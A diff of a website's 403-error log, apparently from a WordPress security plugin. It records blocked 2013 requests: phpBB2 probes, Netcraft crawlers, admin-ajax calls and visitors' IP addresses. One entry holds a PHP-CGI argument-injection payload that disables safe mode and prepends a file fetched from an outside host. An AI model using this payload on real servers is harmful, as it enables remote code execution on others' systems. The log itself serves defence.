+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 27, 2013 - 6:17 пп <<<<<<<<<<<
+REMOTE_ADDR: 158.255.214.124
+Host Name: 124-214-255-158.static.edis.at
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 28, 2013 - 1:00 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.112.82.90
+Host Name: 79-112-82-090.iasi.fiberlink.ro
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -510,13 +1508,825 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/
+REQUEST_URI: /phpBB2/
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 1:54 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 29, 2013 - 4:39 дп <<<<<<<<<<<
+REMOTE_ADDR: 89.70.240.251
+Host Name: 89-70-240-251.dynamic.chello.pl
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 29, 2013 - 4:39 дп <<<<<<<<<<<
+REMOTE_ADDR: 89.70.240.251
+Host Name: 89-70-240-251.dynamic.chello.pl
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 30, 2013 - 6:56 пп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.157.224
+Host Name: 79.105.157.224
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 30, 2013 - 6:56 пп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.157.224
+Host Name: 79.105.157.224
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 2, 2013 - 1:33 пп <<<<<<<<<<<
+REMOTE_ADDR: 158.255.214.124
+Host Name: 124-214-255-158.static.edis.at
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 2, 2013 - 1:34 пп <<<<<<<<<<<
+REMOTE_ADDR: 158.255.214.124
+Host Name: 124-214-255-158.static.edis.at
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 5, 2013 - 8:45 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.211.244.254
+Host Name: ec2-54-211-244-254.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 5, 2013 - 10:15 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.9.77
+Host Name: ec2-54-226-9-77.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 7, 2013 - 8:46 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.172.109.180
+Host Name: 79-172-109-180.dyn.broadband.iskratelecom.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 7, 2013 - 8:46 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.172.109.180
+Host Name: 79-172-109-180.dyn.broadband.iskratelecom.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 8, 2013 - 10:16 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.211.61.130
+Host Name: ec2-54-211-61-130.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 8, 2013 - 10:36 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.211.61.130
+Host Name: ec2-54-211-61-130.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 30, 2013 - 12:10 пп <<<<<<<<<<<
+REMOTE_ADDR: 217.165.3.216
+Host Name: bba174968.alshamil.net.ae
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 30, 2013 - 8:34 пп <<<<<<<<<<<
+REMOTE_ADDR: 91.89.4.173
+Host Name: HSI-KBW-091-089-004-173.hsi2.kabelbw.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: https://bible-core.com/wp-admin/admin-ajax.php?action=oxy_shortcodes&shortcode=image&MCE=false&KeepThis=true&TB_iframe=true
+REQUEST_URI: /wp-admin/admin-ajax.php?image_size=box-medium&image_rounded=yes&image_polaroid=no&image_source=http%3A%2F%2Flocalhost%2Fholybunch_prep%2Fwp-content%2Fuploads%2F2013%2F05%2Fbanner01.png&image_link=&image_icon=&insert=Insert
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 30, 2013 - 8:35 пп <<<<<<<<<<<
+REMOTE_ADDR: 91.89.4.173
+Host Name: HSI-KBW-091-089-004-173.hsi2.kabelbw.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?_ajax_nonce=363f072f24&action=oxy_shortcode_preview&sc=%5Bimage%20source%3D%22http%3A%2F%2Flocalhost%2Fholybunch_prep%2Fwp-content%2Fuploads%2F2013%2F05%2Fbanner01.png%22%20icon%3D%22%22%5D
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 8, 2013 - 3:15 дп <<<<<<<<<<<
+REMOTE_ADDR: 46.19.112.25
+Host Name: du-112-25.sv-en.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 8, 2013 - 4:33 пп <<<<<<<<<<<
+REMOTE_ADDR: 46.19.112.25
+Host Name: du-112-25.sv-en.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 9, 2013 - 3:58 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.146.192
+Host Name: ec2-54-205-146-192.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 9, 2013 - 5:05 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.156.157
+Host Name: ec2-54-205-156-157.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 9, 2013 - 7:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.211.109.218
+Host Name: ec2-54-211-109-218.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 9, 2013 - 8:33 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.37.57
+Host Name: 162.243.37.57
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 12, 2013 - 6:50 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.160.27
+Host Name: 79.105.160.27
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 12, 2013 - 6:51 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.160.27
+Host Name: 79.105.160.27
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 13, 2013 - 6:38 дп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.85.93
+Host Name: ec2-54-205-85-93.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 13, 2013 - 6:56 дп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.85.93
+Host Name: ec2-54-205-85-93.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 14, 2013 - 10:40 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.165.70.123
+Host Name: 178-165-70-123-kh.maxnet.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 14, 2013 - 10:40 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.165.70.123
+Host Name: 178-165-70-123-kh.maxnet.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 22, 2013 - 2:24 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.165.70.123
+Host Name: 178-165-70-123-kh.maxnet.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 22, 2013 - 2:24 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.165.70.123
+Host Name: 178-165-70-123-kh.maxnet.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 29, 2013 - 2:47 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.97.109
+Host Name: ec2-54-205-97-109.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 29, 2013 - 2:47 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.97.109
+Host Name: ec2-54-205-97-109.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 29, 2013 - 2:47 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.97.109
+Host Name: ec2-54-205-97-109.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 30, 2013 - 7:54 дп <<<<<<<<<<<
+REMOTE_ADDR: 109.171.97.172
+Host Name: host-109-171-97-172.bbcustomer.zsttk.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content/osvoboditsa-ot-greha/
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 30, 2013 - 9:08 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.107.2
+Host Name: ec2-54-226-107-2.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 30, 2013 - 9:08 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.107.2
+Host Name: ec2-54-226-107-2.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 30, 2013 - 9:08 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.226.107.2
+Host Name: ec2-54-226-107-2.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 31, 2013 - 12:03 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.134.254
+Host Name: 95.73.134.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Октябрь 31, 2013 - 12:03 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.134.254
+Host Name: 95.73.134.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 1, 2013 - 12:59 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.10.167
+Host Name: 95.73.10.167
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 1, 2013 - 12:59 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.10.167
+Host Name: 95.73.10.167
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 2, 2013 - 11:59 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.84.43.5
+Host Name: 95.84.43.5
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 2, 2013 - 11:59 дп <<<<<<<<<<<
